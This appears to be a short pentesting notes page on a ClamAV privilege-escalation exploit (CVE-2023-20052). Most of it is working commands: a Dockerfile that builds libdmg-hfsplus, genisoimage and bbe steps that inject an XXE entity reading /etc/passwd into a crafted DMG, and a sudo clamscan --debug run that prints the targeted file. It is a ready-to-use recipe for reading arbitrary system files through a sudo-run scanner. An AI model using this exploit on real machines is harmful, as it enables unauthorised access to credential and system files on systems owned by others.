ClamAV

ClamAV is a free, open-source, and cross-platform antivirus engine designed to detect trojans, viruses, malware, and other threats. Commonly used on Linux servers and email gateways, it scans files, attachments, and mail formats to protect against malicious content

Privilege escalation - CVE-2023-20052

    The following exploit allows to read any file in the machine due a mailinterpretation of files to scan. Of course you need to execute ClamAV with sudo privileges to read any file. The steps are the following

    Create the following DockerFile

    FROM ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive

# Dependencias base
RUN apt-get update && apt-get install -y \
    ca-certificates \
    gnupg \
    wget \
    git \
    gcc \
    g++ \
    cmake \
    zlib1g-dev \
    genisoimage \
    bbe \
    make \
    && rm -rf /var/lib/apt/lists/*

# Clonar y compilar libdmg-hfsplus
RUN git clone https://github.com/planetbeing/libdmg-hfsplus.git /libdmg-hfsplus

WORKDIR /libdmg-hfsplus

RUN cmake . && make

RUN cp dmg/dmg /bin/dmg

# Directorio de trabajo del exploit
WORKDIR /exploit

CMD ["/bin/bash"]

    Build it and get a shell inside the container

    sudo docker build -t cve-2023-20052 .  #Create the container
sudo docker run -v $(pwd):/exploit -it cve-2023-20052 bash    #Get a shell insidethe container

    Use the following command. Get it from the repo just in case there som sort of error with tags 

    genisoimage -D -V "exploit" -no-pad -r -apple -file-mode 0777 -o test.img . && dmg dmg test.img test.dmg
bbe -e 's|<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">|<!DOCTYPE plist [<!ENTITY xxe SYSTEM "/etc/passwd"> ]>|' -e 's/blkx/&xxe\;/' test.dmg -o exploit.dmg

    Obviously from this last command modify the file you would like to get. This will output a file called exploit.dmg

    Finally run the clamav to scan the malicious file with the following command and wait for the output where your file will be printed 

    sudo /usr/local/bin/clamscan --debug /home/sbrown/scanfiles/exploit.dmg
